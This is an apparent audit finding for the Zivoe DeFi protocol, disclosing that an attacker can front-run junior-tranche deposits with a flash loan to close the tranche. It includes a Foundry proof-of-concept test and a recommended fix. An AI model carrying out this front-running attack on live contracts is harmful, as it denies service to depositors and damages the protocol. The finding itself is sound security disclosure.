# Malicious user can DoS the junior tranche by depositing over `maxTrancheRatioBIPS`

# [H-02] Malicious user can DoS the junior tranche by depositing over `maxTrancheRatioBIPS`

## Summary
When someone wants to gain exposure on Zivoe protocol, he has to deposit his stablecoins on one of the two `tranches` it provides (junior or senior). By depositing on these tranches, he takes back `zJTT` or `zSTT` which are ERC-20 tokens 1:1 pegged on stablecoin deposited (and also have DEX liquidity pools). However, the `junior` tranche can be "closed" if its relative size to the `senior` tranche exceeds the `maxTrancheRatioBIPS` limit. This can be exploited by an attacker to prevent other users from depositing to the `junior` tranche, effectively DoSing the protocol.

## Vulnerability Detail
Basically, when the `adjustedSupply` of `zJTT` is bigger than the `maxTrancheRatioBIPS` of the `zSTT`(*BIPS), the `junior` tranche is closed. An investor could try to `deposit` his stablecoins to an "open" `junior` tranche and got front-runned by an attacker who has taken a flash loan on stablecoins to close the `junior` tranche by depositing on it. This will revert the investor's transaction and prevent him from depositing to the `junior` tranche. The attacker can then convert his `zJTT` to stablecoins on DEX pools and pay back the flash loan he got to perform this attack. To replay this attack, paste the following code to the `Test_ZivoeTranches.sol` contract and run the test.

```solidity
function test_ZivoeTranches_depositJunior_DoS() public {
        // Initial Tranches Offering going well / as expected.
        simulateITO(250_000 ether, 500_000 ether, 1_000_000 * USD, 500_000 * USD);

        // Victim Sue just wants to deposit 100 DAI to junior tranche.
        uint256 sueDeposit = 100 ether;
        mint("DAI", address(sue), sueDeposit);
        assert(sue.try_approveToken(address(DAI), address(ZVT), sueDeposit));

        // Attacker Bob saw Sue's transaction in the mempool, getting ready for his attack. He gets a flash loan on `amountAttackerHasToDeposit` DAI. 
        (uint256 seniorSupp, uint256 juniorSupp) = GBL.adjustedSupplies();
        uint256 amountAttackerHasToDeposit = (seniorSupp * ZVT.maxTrancheRatioBIPS() / BIPS).floorSub(juniorSupp);
        mint("DAI", address(bob), amountAttackerHasToDeposit);
        assert(bob.try_approveToken(address(DAI), address(ZVT), amountAttackerHasToDeposit));

        // Bob front-runs Sue and deposit just enough DAI to make junior tranche closed.
        hevm.startPrank(address(bob));
        ZVT.depositJunior(amountAttackerHasToDeposit, address(DAI));
        hevm.stopPrank();
        
        // Sue going to deposit her DAI. Her transaction will revert since junior tranche became closed.
        hevm.startPrank(address(sue));
        hevm.expectRevert("ZivoeTranches::depositJunior() !isJuniorOpen(amount, asset)");
        ZVT.depositJunior(sueDeposit, address(DAI));
        hevm.stopPrank();

        // Bob converts his zJTT on DEX pools back to stablecoin.
        hevm.startPrank(address(bob));
        // Bob getting back his stablecoins and paying back the flash loan.
        hevm.stopPrank();
    }
```

## Impact
As a result from this vulnerability, the `junior` tranche can be closed by an attacker and users only can deposit to the `senior` tranche. This will result to a loss of potential revenue for the protocol and a bad user experience for the users as well as break the protocol's functionality.

## Code Snippet
Here is the code snippet that shows how the `junior` tranche is closed when its relative size to the `senior` tranche exceeds the `maxTrancheRatioBIPS` limit :
```solidity
    function isJuniorOpen(uint256 amount, address asset) public view returns (bool open) {
        uint256 convertedAmount = IZivoeGlobals_ZivoeTranches(GBL).standardize(amount, asset);
        (uint256 seniorSupp, uint256 juniorSupp) = IZivoeGlobals_ZivoeTranches(GBL).adjustedSupplies();
        return convertedAmount + juniorSupp <= seniorSupp * maxTrancheRatioBIPS / BIPS;
    }
```

Foundry, VSCode

## Recommendation
Consider using a time-weighted method so to decide when to close the `junior` tranche.
